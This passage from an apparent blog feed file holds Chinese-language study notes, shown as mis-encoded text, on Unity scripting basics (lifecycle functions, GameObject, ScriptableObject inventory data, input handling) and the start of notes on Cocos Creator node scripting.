24ä¸ªç½‘æ ¼ç…§ç‰‡çš„Prefab: SlotUIï¼Œè°ƒæ•´Cell Sizeå’ŒSpacingã€‚åœ¨SlotUIä¸‹æ·»åŠ Imageå’ŒText(è¿™é‡Œéœ€è¦å¼•å…¥TMPèµ„æº)ï¼Œç‰©å“ç…§ç‰‡å’Œç‰©å“æ•°é‡ã€‚æ·»åŠ å…³é—­æŒ‰é’®Buttonç»„ä»¶</li><li>ç»™BackpackUIæ·»åŠ è„šæœ¬Assets/UI.csï¼Œæ§åˆ¶æ˜¾ç¤ºéšè— &amp; æ•°æ®æ˜¾ç¤º<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure></li></ul>]]></content>
      
      <categories>
          
          <category> åŠ¨ç”»/åª’ä½“ </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>Unity Script</title>
      <link href="/2024/12/30/unity%E6%96%87%E6%A1%A3/"/>
      <url>/2024/12/30/unity%E6%96%87%E6%A1%A3/</url>
      <content type="html"><![CDATA[<h3 id="1-é‡è¦çš„ç±»"><a href="#1-é‡è¦çš„ç±»" class="headerlink" title="1. é‡è¦çš„ç±»"></a>1. é‡è¦çš„ç±»</h3><p>GameObjectï¼šè¡¨ç¤ºå¯ä»¥å­˜åœ¨äºåœºæ™¯ä¸­çš„å¯¹è±¡çš„ç±»å‹ã€‚<br>MonoBehaviourï¼šåŸºç±»ï¼Œé»˜è®¤æƒ…å†µä¸‹ï¼Œæ‰€æœ‰ Unity è„šæœ¬éƒ½æ´¾ç”Ÿè‡ªè¯¥ç±»ã€‚<br>Objectï¼šUnity å¯ä»¥åœ¨ç¼–è¾‘å™¨ä¸­å¼•ç”¨çš„æ‰€æœ‰å¯¹è±¡çš„åŸºç±»ã€‚<br>Transformï¼šæä¾›å¤šç§æ–¹å¼æ¥é€šè¿‡è„šæœ¬å¤„ç†æ¸¸æˆå¯¹è±¡çš„ä½ç½®ã€æ—‹è½¬å’Œç¼©æ”¾ï¼Œä»¥åŠä¸çˆ¶å’Œå­æ¸¸æˆå¯¹è±¡çš„å±‚çº§å…³ç³»ã€‚<br>Vectorsï¼šç”¨äºè¡¨è¾¾å’Œæ“ä½œ 2Dã€3D å’Œ 4D ç‚¹ã€çº¿å’Œæ–¹å‘çš„ç±»ã€‚<br>Quaternionï¼šè¡¨ç¤ºç»å¯¹æˆ–ç›¸å¯¹æ—‹è½¬çš„ç±»ï¼Œå¹¶æä¾›åˆ›å»ºå’Œæ“ä½œå®ƒä»¬çš„æ–¹æ³•ã€‚<br>ScriptableObjectï¼šå¯ç”¨äºä¿å­˜å¤§é‡æ•°æ®çš„æ•°æ®å®¹å™¨ã€‚<br>Timeï¼ˆä»¥åŠå¸§ç‡ç®¡ç†ï¼‰ï¼šTime ç±»ç”¨äºæµ‹é‡å’Œæ§åˆ¶æ—¶é—´ï¼Œå¹¶ç®¡ç†é¡¹ç›®çš„å¸§ç‡ã€‚<br>Mathfï¼šä¸€ç»„å¸¸è§çš„æ•°å­¦å‡½æ•°ï¼ŒåŒ…æ‹¬ä¸‰è§’å‡½æ•°ã€å¯¹æ•°å‡½æ•°ä»¥åŠæ¸¸æˆå’Œåº”ç”¨å¼€å‘ä¸­å¸¸ç”¨çš„å…¶ä»–å‡½æ•°ã€‚<br>Randomï¼šæä¾›ç®€ä¾¿çš„æ–¹æ³•æ¥ç”Ÿæˆå„ç§å¸¸ç”¨ç±»å‹çš„éšæœºå€¼ã€‚<br>Debugï¼šç”¨äºå¯è§†åŒ–ç¼–è¾‘å™¨ä¸­çš„ä¿¡æ¯ï¼Œè¿™äº›ä¿¡æ¯å¯ä»¥å¸®åŠ©æ‚¨äº†è§£æˆ–è°ƒæŸ¥é¡¹ç›®è¿è¡Œæ—¶å‘ç”Ÿçš„æƒ…å†µã€‚<br>Gizmos å’Œ Handlesï¼šç”¨äºåœ¨ Scene è§†å›¾å’Œ Game è§†å›¾ç»˜åˆ¶çº¿æ¡å’Œå½¢çŠ¶ä»¥åŠäº¤äº’å¼æ‰‹æŸ„å’Œæ§ä»¶ã€‚</p><h4 id="1-1-MonoBehaviour"><a href="#1-1-MonoBehaviour" class="headerlink" title="1.1 MonoBehaviour"></a>1.1 MonoBehaviour</h4><p>åŸºç±»ï¼Œé»˜è®¤æƒ…å†µä¸‹ï¼Œæ‰€æœ‰ Unity è„šæœ¬éƒ½æ´¾ç”Ÿè‡ªè¯¥ç±»ã€‚ä¸ºäº†è¿æ¥åˆ° Unity çš„å†…éƒ¨æ¶æ„ï¼Œä½ åˆ›å»ºçš„ç±»éœ€è¦ç»§æ‰¿<code>MonoBehaviour</code>ç”¨äºæ·»åŠ åˆ°åˆ°æ¸¸æˆå¯¹è±¡çš„ä¸Šã€‚</p><ul><li>åˆ›å»ºä¸€ä¸ªåœ¨Inspectoré‡Œå¯ç¼–è¾‘çš„å­—æ®µï¼šå®šä¹‰ä¸€ä¸ª<code>public</code>å˜é‡</li><li><p>éšè—åœ¨Inspectoré‡Œæ˜¾ç¤ºï¼Œæ·»åŠ <code>[HideInInspectors]</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">using UnityEngine;</span><br><span class="line">using System.Collections;</span><br><span class="line"></span><br><span class="line">public class MainPlayer : MonoBehaviour </span><br><span class="line">&#123;</span><br><span class="line">  // åˆ›å»ºä¸€ä¸ªåœ¨Inspectoré‡Œå¯ç¼–è¾‘çš„å­—æ®µ</span><br><span class="line">  public string myName;</span><br><span class="line">  </span><br><span class="line">  void Start () </span><br><span class="line">  &#123;</span><br><span class="line">      Debug.Log(&quot;I am alive and my name is &quot; + myName);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>ç”Ÿå‘½å‘¨æœŸå‡½æ•°<br>(<a href="https://docs.unity.cn/cn/current/Manual/ExecutionOrder.html" target="_blank" rel="noopener">æ›´å¤šäº‹ä»¶å‡½æ•°: åŠ¨ç”»æ›´æ–°å¾ªç¯ï¼ŒRendering, å¸§ä¹‹é—´ï¼Œ Editoræ“ä½œ</a>)</p><ul><li>åŠ è½½<ul><li>Awake: åœ¨ä»»ä½• Start å‡½æ•°ä¹‹å‰å¹¶åœ¨å®ä¾‹åŒ–é¢„åˆ¶ä»¶ä¹‹åè°ƒç”¨</li><li>OnEnable: åœ¨å¯ç”¨å¯¹è±¡åç«‹å³è°ƒç”¨</li><li>Start: ä»…å½“å¯ç”¨è„šæœ¬å®ä¾‹åï¼Œæ‰ä¼šåœ¨ç¬¬ä¸€æ¬¡å¸§æ›´æ–°ä¹‹å‰è°ƒç”¨ Start</li></ul></li><li>æ›´æ–°<ul><li>FixedUpdate: åœ¨æ¯æ¬¡ç‰©ç†æ›´æ–°ä¹‹å‰éƒ½ä¼šè°ƒç”¨ä¸€ä¸ªç§°ä¸º FixedUpdate çš„å•ç‹¬äº‹ä»¶å‡½æ•°</li><li>Update: æ¯å¸§è°ƒç”¨ä¸€æ¬¡ Update</li><li>LateUpdate: æ¯å¸§è°ƒç”¨ä¸€æ¬¡ LateUpdate</li></ul></li><li>é”€æ¯<ul><li>OnDestroy: å¯¹è±¡å­˜åœ¨çš„æœ€åä¸€å¸§å®Œæˆæ‰€æœ‰å¸§æ›´æ–°ä¹‹å</li><li>OnApplicationQuit: åœ¨é€€å‡ºåº”ç”¨ç¨‹åºä¹‹å‰åœ¨æ‰€æœ‰æ¸¸æˆå¯¹è±¡ä¸Šè°ƒç”¨æ­¤å‡½æ•° </li><li>OnDisable: è¡Œä¸ºè¢«ç¦ç”¨æˆ–å¤„äºéæ´»åŠ¨çŠ¶æ€æ—¶</li></ul></li></ul></li></ul><p><br></p><h4 id="1-2-GameObject"><a href="#1-2-GameObject" class="headerlink" title="1.2 GameObject"></a>1.2 GameObject</h4><p>ç”¨äºè¡¨ç¤ºä»»ä½•å¯ä»¥å­˜åœ¨äºåœºæ™¯ä¸­çš„äº‹ç‰©<br>å±æ€§</p><ul><li><code>gameObject.tag</code></li><li><code>gameObject.transform</code></li><li><code>gameObject.transform.position = new Vector3(1,1,0)</code></li><li><code>gameObject.enabled</code></li><li><code>gameObject.layer</code></li></ul><p>æ–¹æ³•</p><ul><li><code>gameObject.GetComponent&lt;Animator&gt;()</code>è·å–é™„åŠ åœ¨æ¸¸æˆå¯¹è±¡ä¸Šç±»å‹ä¸ºTypeçš„ç»„ä»¶</li><li><code>gameObject.GetComponentInChildren&lt;Image&gt;()</code>æ·±åº¦é¦–æ¬¡æœç´¢è¿”å› GameObject æˆ–å…¶ä»»ä½•å­é¡¹ä¸­ç±»å‹ä¸º type çš„ç»„ä»¶</li><li><code>gameObject.AddComponent(SphereCollider)</code>å°†ç»„ä»¶æ·»åŠ åˆ°è¯¥æ¸¸æˆå¯¹è±¡ä¸Š</li><li><code>gameObject.setActive(bool)</code>æ¿€æ´»/åœç”¨</li></ul><p>é™æ€æ–¹æ³•</p><ul><li><code>GameObject.Find(&quot;MainHeroCharacter&quot;)</code>æŒ‰nameæŸ¥æ‰¾GameObject</li><li><code>GameObject.FindWithTag(&quot;Chef&quot;)</code>è¿”å›ä¸€ä¸ªtagä¸º Chef çš„æ´»åŠ¨ GameObjectã€‚å¦‚æœæœªæ‰¾åˆ° GameObjectï¼Œåˆ™è¿”å› nullã€‚</li><li><code>GameObject.FindGameObjectsWithTag(&quot;Stove&quot;)</code>è¿”å›æ ‡ç­¾ä¸º Stove çš„æ´»åŠ¨ GameObjects çš„æ•°ç»„</li></ul><p>é™æ€å‡½æ•°</p><ul><li><code>Instantiate(prefab, position, rotation, parent)</code> å®ä¾‹åŒ–é¢„åˆ¶ä»¶</li><li><code>Destory(gameObject)</code>ç§»é™¤</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">// è·å–å¤–éƒ¨æ¸¸æˆå¯¹è±¡</span><br><span class="line">public GameObject House;</span><br><span class="line"></span><br><span class="line">// è·å– &amp; é”€æ¯</span><br><span class="line">private void OnTriggerEnter2D(Collider2D collision)</span><br><span class="line">&#123;</span><br><span class="line">  Destroy(collision.gameObject);</span><br><span class="line">  Destroy(this)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="1-3-Vector"><a href="#1-3-Vector" class="headerlink" title="1.3 Vector"></a>1.3 Vector</h4><p>Vector2ã€Vector3 å’Œ Vector4 ç±»æ¥å¤„ç† 2Dã€3D å’Œ 4D çŸ¢é‡<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">var heading = target.position - player.position;</span><br><span class="line">var distance = heading.magnitude; // å‘é‡é•¿åº¦</span><br><span class="line">var direction = heading / distance; // å‘é‡å½’ä¸€åŒ–</span><br></pre></td></tr></table></figure></p><h4 id="1-4-ScriptableObject"><a href="#1-4-ScriptableObject" class="headerlink" title="1.4 ScriptableObject"></a>1.4 ScriptableObject</h4><p><code>ScriptableObject</code> æ˜¯ä¸€ä¸ªå¯ç‹¬ç«‹äºç±»å®ä¾‹æ¥ä¿å­˜å¤§é‡æ•°æ®çš„æ•°æ®å®¹å™¨ã€‚<code>ScriptableObject</code> ä¸èƒ½é™„åŠ åˆ°æ¸¸æˆå¯¹è±¡ä¸Šã€‚æ­£ç¡®çš„åšæ³•æ˜¯éœ€è¦å°†å®ƒä»¬ä¿å­˜ä¸ºé¡¹ç›®ä¸­çš„èµ„æºã€‚</p><ol><li><p>æ–°å¢æ•°æ®<br>å®šä¹‰æ•°æ®ç±»å‹ï¼Œåœ¨Assets - create ItemData, create BackpackDataåˆ›å»ºæ•°æ®ï¼Œå¹¶åœ¨Inspectoré¢æ¿åˆå§‹åŒ–æ•°æ®ã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">// ItemData.cs</span><br><span class="line">public enum ItemType</span><br><span class="line">&#123;</span><br><span class="line">    None,</span><br><span class="line">    Seed_Carrot,</span><br><span class="line">    Seed_Tomato,</span><br><span class="line">    Hoe</span><br><span class="line">&#125;</span><br><span class="line">[CreateAssetMenu()]</span><br><span class="line">public class ItemData: ScriptableObject</span><br><span class="line">&#123;</span><br><span class="line">    public ItemType type = ItemType.None;</span><br><span class="line">    public Sprite sprite;</span><br><span class="line">    public GameObject prefab;</span><br><span class="line">    public int maxCount = 1;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// SlotData.cs</span><br><span class="line">[Serializable]</span><br><span class="line">public class SlotData</span><br><span class="line">&#123;</span><br><span class="line">  public ItemData item;</span><br><span class="line">  public int count = 0;</span><br><span class="line">  public void Add(int num = 1)</span><br><span class="line">  &#123;</span><br><span class="line">    this.count += num;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// BackpackData.cs</span><br><span class="line">[CreateAssetMenu()]</span><br><span class="line">public class BackpackData : ScriptableObject</span><br><span class="line">&#123;</span><br><span class="line">    public List&lt;SlotData&gt; slotList;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>è·å–æ•°æ®<br>é€šè¿‡ <code>Resources.Load</code> å‡½æ•°ï¼Œå¯è®¿é—® Assets æ–‡ä»¶å¤¹ä¸­å¤„äºä»»æ„ä½ç½®çš„åä¸ºâ€œResourcesâ€çš„æ–‡ä»¶å¤¹ä¸­çš„æ‰€æœ‰èµ„æºã€‚ å¯ä»¥å­˜åœ¨å¤šä¸ªâ€œResourcesâ€æ–‡ä»¶å¤¹ï¼ŒåŠ è½½å¯¹è±¡æ—¶ï¼Œå°†å¯¹æ¯ä¸ªæ–‡ä»¶å¤¹è¿›è¡Œæ£€æŸ¥ã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">// è·å–æ•°æ®</span><br><span class="line">public BackpackData backpack;</span><br><span class="line">private void Awake()</span><br><span class="line">&#123;</span><br><span class="line">  ItemData[] itemDataArray = Resources.LoadAll&lt;ItemData&gt;(&quot;Data&quot;);</span><br><span class="line">  backpack = Resources.Load&lt;BackpackData&gt;(&quot;Data/Backpack&quot;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// å¢åˆ æ•°æ®</span><br><span class="line">public void AddToBackpack(ItemType type)</span><br><span class="line">&#123;</span><br><span class="line">  foreach(SlotData slotData in backpack.slotList)</span><br><span class="line">  &#123;</span><br><span class="line">    if (slotData.item.type == type)</span><br><span class="line">    &#123;</span><br><span class="line">      slotData.Add(); // æ­¤å¤„å¯ä»¥æ›´æ–°UI</span><br><span class="line">      return;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol><h4 id="1-5-transform"><a href="#1-5-transform" class="headerlink" title="1.5 transform"></a>1.5 transform</h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">transform.Translate(direction * speed * Time.deltaTime); <span class="comment">// ä½ç§»</span></span><br></pre></td></tr></table></figure><h4 id="1-6-Time"><a href="#1-6-Time" class="headerlink" title="1.6 Time"></a>1.6 Time</h4><h4 id="1-7-Canvas"><a href="#1-7-Canvas" class="headerlink" title="1.7 Canvas"></a>1.7 Canvas</h4><p>EventSystem æ˜¯ä¸“é—¨ä¸ºUIæœåŠ¡çš„</p><ul><li><code>EventSystem.current.IsPointerOverGameObject()</code> åˆ¤æ–­é¼ æ ‡æ˜¯å¦åœ¨ç‰©ä½“ä¸Š<br><br></li></ul><p><br></p><h3 id="2-åŠ¨ç”»"><a href="#2-åŠ¨ç”»" class="headerlink" title="2. åŠ¨ç”»"></a>2. åŠ¨ç”»</h3><p><code>Animator</code>åŠ¨ç”»<br><code>Animator Controller</code>åŠ¨ç”»çŠ¶æ€æœºï¼Œè´Ÿè´£è·Ÿè¸ªå½“å‰åº”è¯¥æ’­æ”¾å“ªä¸ªå‰ªè¾‘ä»¥åŠåŠ¨ç”»åº”è¯¥ä½•æ—¶æ”¹å˜æˆ–æ··åˆåœ¨ä¸€èµ·ã€‚<br><code>Animatorç»„ä»¶</code></p><h3 id="3-Tilemap"><a href="#3-Tilemap" class="headerlink" title="3. Tilemap"></a>3. Tilemap</h3><h3 id="4-äº‹ä»¶"><a href="#4-äº‹ä»¶" class="headerlink" title="4. äº‹ä»¶"></a>4. äº‹ä»¶</h3><h4 id="4-1-ç‰©ç†äº‹ä»¶"><a href="#4-1-ç‰©ç†äº‹ä»¶" class="headerlink" title="4.1 ç‰©ç†äº‹ä»¶"></a>4.1 ç‰©ç†äº‹ä»¶</h4><p>ç‰©ç†å¼•æ“å°†é€šè¿‡è°ƒç”¨è¯¥å¯¹è±¡çš„è„šæœ¬ä¸Šçš„äº‹ä»¶å‡½æ•°æ¥æŠ¥å‘Šå¯¹è±¡çš„ç¢°æ’æƒ…å†µã€‚ å‡½æ•°ã€‚å¯¹è±¡çš„ç¢°æ’ä½“é…ç½®ä¸ºè§¦å‘å™¨ï¼ˆå³ï¼Œç¢°æ’ä½“åªæ£€æµ‹æŸç‰©ä½•æ—¶è¿›å…¥è€Œä¸è¿›è¡Œç‰©ç†ååº”ï¼‰æ—¶ï¼Œå°†è°ƒç”¨ç›¸åº”çš„ ã€ å’Œ  å‡½æ•°ã€‚</p><ul><li>ç¢°æ’å™¨<ul><li>OnCollisionEnter</li><li>OnCollisionStay</li><li>OnCollisionExit</li></ul></li><li>è§¦å‘å™¨<ul><li>OnTriggerEnter</li><li>OnTriggerStay</li><li>OnTriggerExit</li></ul></li><li>Collisionå‚æ•°ç¢°æ’ä½“</li></ul><h4 id="4-2-ç‚¹å‡»äº‹ä»¶"><a href="#4-2-ç‚¹å‡»äº‹ä»¶" class="headerlink" title="4.2 ç‚¹å‡»äº‹ä»¶"></a>4.2 ç‚¹å‡»äº‹ä»¶</h4><p>ç»‘å®šç‚¹å‡»äº‹ä»¶çš„3ç§æ–¹æ³•</p><ul><li>æ·»åŠ buttonæŒ‰é’®</li><li>add component: event trigger</li></ul><h4 id="4-3-ç›‘å¬é¼ æ ‡é”®ç›˜äº‹ä»¶"><a href="#4-3-ç›‘å¬é¼ æ ‡é”®ç›˜äº‹ä»¶" class="headerlink" title="4.3 ç›‘å¬é¼ æ ‡é”®ç›˜äº‹ä»¶"></a>4.3 ç›‘å¬é¼ æ ‡é”®ç›˜äº‹ä»¶</h4><p>Input.GetAxis ä¸ä»¥ä¸‹é»˜è®¤è½´ä¹‹ä¸€é…åˆä½¿ç”¨ï¼š â€œHorizontalâ€å’Œâ€œVerticalâ€æ˜ å°„åˆ°æ¸¸æˆæ†ï¼ˆDã€Dã€Dã€D å’Œç®­å¤´é”®ï¼‰ã€‚ â€œMouse Xâ€å’Œâ€œMouse Yâ€æ˜ å°„åˆ°é¼ æ ‡å¢é‡ã€‚ â€œFire1â€ã€â€œFire2â€ã€â€œFire3â€æ˜ å°„åˆ° Cmdã€Cmdã€Cmd é”®å’Œä¸‰ä¸ªé¼ æ ‡æˆ–æ¸¸æˆæ†æŒ‰é’®ã€‚<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">private void FixedUpdate() </span><br><span class="line">&#123;</span><br><span class="line">  float x = Input.GetAxisRaw(&quot;Horizontal&quot;);</span><br><span class="line">  float y = Input.GetAxisRaw(&quot;Vertical&quot;);</span><br><span class="line">  direction = new Vector2(x, y); // ä¸Šä¸‹å·¦å³æ–¹å‘</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h4 id="4-4-æ‹–æ‹½ç‰©å“"><a href="#4-4-æ‹–æ‹½ç‰©å“" class="headerlink" title="4.4 æ‹–æ‹½ç‰©å“"></a>4.4 æ‹–æ‹½ç‰©å“</h4><p>å®ç°æ‹–æ‹½ç‰©å“ï¼Œå¹¶è·Ÿéšé¼ æ ‡ç§»åŠ¨<br><code>EventSystem.current.IsPointerOverGameObject()</code> åˆ¤æ–­é¼ æ ‡æ˜¯å¦åœ¨ç‰©ä½“ä¸Š<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">private void Update()</span><br><span class="line">&#123;</span><br><span class="line">  Vector2 position;</span><br><span class="line">  RectTransformUtilty.ScreenPointToLocalPointInRectangle(</span><br><span class="line">    gameObject,</span><br><span class="line">    Input.mousePosition,</span><br><span class="line">    null,</span><br><span class="line">    out position</span><br><span class="line">  );</span><br><span class="line">  gameObject.anchoredPosition = position;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p><br></p><h3 id="6-Attributes"><a href="#6-Attributes" class="headerlink" title="6. Attributes"></a>6. Attributes</h3><ul><li><code>[Serializable]</code></li><li><code>[[CreateAssetMenu(fileName, menuName, order)]</code><br>å¯¹ ScriptableObject æ´¾ç”Ÿç±»å‹è¿›è¡Œæ ‡è®°ï¼Œä½¿å…¶è‡ªåŠ¨åˆ—åœ¨ Assets/Create å­èœå•ä¸­ï¼Œä»¥ä¾¿èƒ½å¤Ÿè½»æ¾åˆ›å»ºè¯¥ç±»å‹çš„å®ä¾‹å¹¶å°†å…¶ä½œä¸ºâ€œ.assetâ€æ–‡ä»¶å­˜å‚¨åœ¨é¡¹ç›®ä¸­ã€‚</li><li><code>[HideInInspector]</code>ä½¿å˜é‡ä¸æ˜¾ç¤ºåœ¨ Inspector ä¸­</li></ul><p>Inspector</p><ul><li><code>[Header(&quot;æµ‹è¯•å­—ç¬¦ä¸²&quot;)]</code></li><li><code>[Space(10)]</code></li></ul><h3 id="7-åŠ¨ç”»ç¼–è¾‘å™¨"><a href="#7-åŠ¨ç”»ç¼–è¾‘å™¨" class="headerlink" title="7. åŠ¨ç”»ç¼–è¾‘å™¨"></a>7. åŠ¨ç”»ç¼–è¾‘å™¨</h3><h3 id="å‚è€ƒæ–‡æ¡£"><a href="#å‚è€ƒæ–‡æ¡£" class="headerlink" title="å‚è€ƒæ–‡æ¡£"></a>å‚è€ƒæ–‡æ¡£</h3><ul><li><a href="https://docs.unity.cn/cn/current/Manual/ExecutionOrder.html" target="_blank" rel="noopener">unityæ–‡æ¡£</a></li></ul>]]></content>
      
      
    </entry>
    
    <entry>
      <title>CocossCreator Script</title>
      <link href="/2024/12/18/cocosCreator%E5%9F%BA%E6%9C%AC%E6%A6%82%E5%BF%B5/"/>
      <url>/2024/12/18/cocosCreator%E5%9F%BA%E6%9C%AC%E6%A6%82%E5%BF%B5/</url>
      <content type="html"><![CDATA[<h3 id="1-ccç±»"><a href="#1-ccç±»" class="headerlink" title="1. ccç±»"></a>1. ccç±»</h3><p>å°†è£…é¥°å™¨ ccclass åº”ç”¨åœ¨ç±»ä¸Šæ—¶ï¼Œæ­¤ç±»ç§°ä¸º cc ç±»ã€‚cc ç±»æ³¨å…¥äº†é¢å¤–çš„ä¿¡æ¯ä»¥æ§åˆ¶ Cocos Creator å¯¹è¯¥ç±»å¯¹è±¡çš„åºåˆ—åŒ–ã€ç¼–è¾‘å™¨å¯¹è¯¥ç±»å¯¹è±¡çš„å±•ç¤ºç­‰ã€‚</p><h4 id="1-1-property"><a href="#1-1-property" class="headerlink" title="1.1 property"></a>1.1 <code>property</code></h4><p>å±æ€§è£…é¥°å™¨ property å¯ä»¥è¢«åº”ç”¨åœ¨ cc ç±»çš„å±æ€§æˆ–è®¿é—®å™¨ä¸Š<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyClass</span> </span>&#123;</span><br><span class="line">  @property(Node)</span><br><span class="line">  targetNode: Node= <span class="literal">null</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h4 id="1-2-ç”Ÿå‘½å‘¨æœŸ"><a href="#1-2-ç”Ÿå‘½å‘¨æœŸ" class="headerlink" title="1.2 ç”Ÿå‘½å‘¨æœŸ"></a>1.2 ç”Ÿå‘½å‘¨æœŸ</h4><p>onLoad<br>onEnable<br>start<br>update<br>lateUpdate<br>onDisable<br>onDestroy</p><h3 id="2-è„šæœ¬ä½¿ç”¨"><a href="#2-è„šæœ¬ä½¿ç”¨" class="headerlink" title="2. è„šæœ¬ä½¿ç”¨"></a>2. è„šæœ¬ä½¿ç”¨</h3><h4 id="2-1-è®¿é—®èŠ‚ç‚¹"><a href="#2-1-è®¿é—®èŠ‚ç‚¹" class="headerlink" title="2.1 è®¿é—®èŠ‚ç‚¹"></a>2.1 è®¿é—®èŠ‚ç‚¹</h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// è·å–ç»„ä»¶æ‰€åœ¨èŠ‚ç‚¹</span></span><br><span class="line">start() &#123;</span><br><span class="line">  <span class="keyword">const</span> node = <span class="keyword">this</span>.node;</span><br><span class="line">  node.setPosition(<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// è·å–åŒä¸€èŠ‚ç‚¹ä¸Šçš„å…¶ä»–ç»„ä»¶</span></span><br><span class="line"><span class="keyword">this</span>.getComponent(<span class="string">'OtherNode'</span>) <span class="comment">// ä¼ å…¥çš„å‚æ•°æ˜¯ä¸€ä¸ªç±»å</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// è·å–å…¶ä»–èŠ‚ç‚¹ï¼Œé€šè¿‡propertyä¼ å…¥</span></span><br><span class="line">@property(Node)</span><br><span class="line">private payer = <span class="literal">null</span></span><br></pre></td></tr></table></figure><h4 id="2-2-æ›´æ”¹èŠ‚ç‚¹"><a href="#2-2-æ›´æ”¹èŠ‚ç‚¹" class="headerlink" title="2.2 æ›´æ”¹èŠ‚ç‚¹"></a>2.2 æ›´æ”¹èŠ‚ç‚¹</h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// æ¿€æ´»/å…³é—­èŠ‚ç‚¹ï¼šè¢«æ¿€æ´»çš„èŠ‚ç‚¹ï¼Œæ¯å¸§éƒ½ä¼šæ‰§è¡Œupdateæ–¹æ³•</span></span><br><span class="line"><span class="keyword">this</span>.node.active = boolean</span><br><span class="line"></span><br><span class="line"><span class="comment">// æ›´æ”¹èŠ‚ç‚¹çš„çˆ¶èŠ‚ç‚¹</span></span><br><span class="line"><span class="keyword">this</span>.node.parent = parentNode;</span><br><span class="line"><span class="comment">// or</span></span><br><span class="line"><span class="keyword">this</span>.node.removeFromParent();</span><br><span class="line">parentNode.addChild(<span class="keyword">this</span>.node);</span><br><span class="line"></span><br><span class="line"><span class="comment">// è·å–å­èŠ‚ç‚¹</span></span><br><span class="line"><span class="keyword">this</span>.node.children</span><br><span class="line"></span><br><span class="line"><span class="comment">// 